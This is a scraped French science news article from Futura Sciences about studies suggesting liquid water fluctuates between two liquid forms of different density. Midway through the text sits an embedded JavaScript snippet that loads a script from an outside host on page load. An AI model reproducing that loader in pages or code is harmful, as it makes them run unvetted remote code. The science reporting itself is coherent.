{"title": "L'eau est bien composee de deux liquides !", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-06-28", "content": "Les etonnantes proprietes de l'eau liquide viennent bien de ce qu'elle fluctue entre deux etats distincts, comme le montrent de nouvelles etudes menees a basse temperature a l'aide des rayons X. Ces deux fluides peuvent se separer dans certaines conditions. Aux yeux des physiciens et des chimistes, l' eau  possede des proprietes singulieres, meme sans evoquer son role evident pour nous, organismes vivants. En effet, lorsque la pression ou la temperature varient dans certains intervalles, la densite, la chaleur specifique, la viscosite et la compressibilite de l'eau varient a l'inverse du comportement d'autres liquides. Ainsi, l'eau se dilate quand elle gele : voila pourquoi les glacons flottent a la surface d'un verre d'eau. La densite de l'eau est en fait maximale vers 4 degC, ce qui explique pourquoi les fonds des lacs et des rivieres sont occupes par des eaux a cette temperature, qui sont plus denses et donc plus lourdes a  volume  egal. Il en est generalement de meme au fond des oceans, mais pas toujours car la salinite de l'eau peut intervenir. Il y a quelques mois, une equipe internationale de chercheurs, dont plusieurs sont en poste a l'universite de Stockholm, avait publie un article faisant etat de travaux portant sur la structure de l'eau lorsqu'elle passe de l'etat de  glace   amorphe  a celui d'un  liquide . Les physiciens avaient utilise une technique de  diffraction  des  rayons X  employee en  cristallographie . Les mesures semblaient confirmer une theorie expliquant que l'eau liquide, meme si on n'y rencontre que des  molecules  H 2 O, est en fait un melange complexe de deux liquides. L'eau a 4 degC est plus dense que la glace qui la surplombe. Le glacon flotte. Mieux, dans certaines conditions de pression et de temperature, l'eau doit se separer en deux phases liquides macroscopiques alors qu'elle est en general un melange complexe. (c)  Stockholm University                               L'eau pourrait se separer en deux phases liquides Plusieurs des membres suedois de l'equipe a l'origine de cette decouverte publient aujourd'hui les resultats d'autres travaux sur les mysteres de l'eau dans un article de  Science . Des sources laser de rayons X au Japon et en Coree du Sud ont ete mises a contribution pour etudier le comportement et la structure de l'eau en etat de  surfusion . Elle conserve alors son etat liquide a pression ambiante mais a des temperatures qui peuvent etre a plusieurs dizaines de degres en dessous de 0 degC. Des chocs peuvent alors toutefois conduire a une prise en glace tres rapide.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'eau se dilate d'autant plus rapidement avec une variation de temperature qu'elle est froide et en dessous de 4 degC. Le phenomene est cense etre maximal a -44 degC. C'est a cette temperature que ces chercheurs ont mene leurs experiences pour etudier la prise en glace. Elles ont confirme que l'eau etait bien un melange complexe oscillant perpetuellement entre deux liquides differents. Mais surtout, les chercheurs en tirent la conclusion que les deux liquides entre lesquels l'eau fluctue peuvent en fait se separer en deux phases de densites differentes, comme le ferait l'eau et l'huile comme l'explique dans une  video  Anders Nilsson, professeur de physico-chimie a l'universite de Stockholm.  En bonus, ces travaux ont montre des differences selon que l'eau etait ou non de l'eau lourde, donc de formule D 2 O, ou D designe un isotope de l'hydrogene, le  deuterium . Ces differences doivent provenir d'effets  quantiques  resultant de l'influence des noyaux d'hydrogene sur les corteges d' electrons .  Pour en savoir plus  Surprise : l'eau est composee de deux liquides ! Article de Laurent Sacco publie le 28/06/2017 L'eau a des proprietes singulieres qui deroutent encore chimistes et physiciens. En etudiant differentes formes de glace en train de fondre avec des rayons X, un groupe de chercheurs vient d'etablir que l'eau liquide etait en fait un melange complexe de deux formes liquides de l'eau. L'eau est au centre de notre vie. Elle semble ordinaire et familiere, en tout cas pour nous, occidentaux des XX e  et XXI e  siecles. Pourtant, c'est un liquide singulier pour les physiciens et les chimistes. D'ailleurs, ceux-ci n'ont pas encore perce tous les secrets de l'eau, meme armes des  ordinateurs  modernes et de l' equation de Schrodinger . D'abord, l'eau est un  solvant  presque universel, en particulier pour les  solides  ioniques (comme les cristaux de sel) et les  corps composes  de molecules polaires. Ensuite, contrairement aux autres liquides, l'eau augmente de volume quand elle gele ; c'est ce qui explique que les icebergs flottent. Toutefois, cela n'est vrai que lorsque l'on considere la forme de la glace connue de tout a chacun, mais physiciens et chimistes savent bien que  plusieurs types de glace  apparaissent dans differentes phases selon les conditions de temperature et de pression. Ils connaissent ainsi plus d'une dizaine de  formes cristallines  de l'eau, et meme une forme dite amorphe, ou il n'existe pas vraiment de structures ordonnees a grande echelle. Ils savent toutefois que, meme dans de l'eau liquide a des echelles de temps et de distances tres courtes, des molecules d'eau s'assemblent tres transitoirement du fait des fameuses  liaisons hydrogene  en donnant des structures cristallines. Ces structures sont appelees << des  clusters  d'eau >>. Ce phenomene est si mal compris qu'il est actuellement considere comme l'un des problemes non resolus de la  chimie . Une introduction a la cristallographie aux rayons X. (c) The Royal Institution, YouTube  Les mysteres de la structure de l'eau Pour tenter de percer les mysteres de la structure de l'eau, qu'elle soit solide ou liquide, les physiciens ont recours a une puissante methode de cristallographie : la diffraction des rayons X. Celle-ci a revolutionne notre comprehension de la  matiere , comme l'explique tres bien la video ci-dessus. Mais, qui dit diffraction de rayons X, dit tout d'abord sources de rayons X : il s'agit generalement de  synchrotrons , c'est-a-dire, plus precisement, d'accelerateurs d'electrons. Or, comme les membres d'une equipe internationale de physiciens viennent de l'expliquer dans une publication disponible sur  Pnas , ils se sont servis des sources disponibles au laboratoire national d'Argonne (Etats-Unis) et au Desy (Deutsches Elektronen-Synchrotron, Synchrotron allemand a electrons), a Hambourg. Les chercheurs ont tire de leurs experiences la conclusion que l'eau liquide devait en fait etre un melange de deux formes liquides pour l'eau. Les specialistes s'en doutaient depuis un certain temps. En effet, comme explique precedemment, la glace peut exister sous plusieurs formes cristallines et il existe aussi une << forme amorphe >>, qui n'est pas ordonnee a grande echelle et qui est donc desordonnee comme un liquide. Deux glaces amorphes qui donnent deux liquides differents en fondant Or, il existe en fait deux formes de  glace amorphe  ; leurs densites ne sont pas les memes et elles peuvent se transformer l'une dans l'autre. Les physico-chimistes s'etaient donc demande si l'eau liquide n'etait pas finalement elle-meme un melange de deux formes liquides, egalement de densites differentes et dont chacune pouvait conduire a basse temperature a de la glace amorphe. C'est precisement la transformation de ces glaces amorphes en liquides que les chercheurs ont pu suivre en etudiant avec les rayons X les modifications des structures malgre tout presentes. Selon Lars G. M. Pettersson, professeur en physico-chimie theorique a l'universite de Stockholm et coauteur du travail publie dans Pnas, << les nouveaux resultats soutiennent fortement l'idee que l'eau, a temperature ambiante, ne peut pas decider dans laquelle des deux formes elle devrait etre, a haute ou faible densite, ce qui entraine des fluctuations locales entre les deux. En un mot : l'eau n'est pas un liquide complique, mais deux liquides simples avec une relation compliquee >>. Ce qu'il faut retenir Il existe plus de 70 proprietes de l'eau (point de fusion, densite, capacite calorifique, etc.) qui, prises ensemble, different de celles de la plupart des liquides. Ces proprietes anormales de l'eau sont une condition prealable a la vie telle que nous la connaissons. Pourtant, personne ne comprend tres bien leurs origines. L'eau peut aussi exister sous differentes formes de glaces, cristallines ou << amorphes >>. Elle contient, meme liquide, des petites structures ordonnees transitoires qu'il est possible d'etudier avec la diffraction des rayons X. Cette methode vient de reveler que l'eau liquide ordinaire etait elle-meme un melange complexe et fluctuant de deux formes liquides qui peuvent se separer macroscopiquement dans certaines conditions. ", "theme": "sciences"}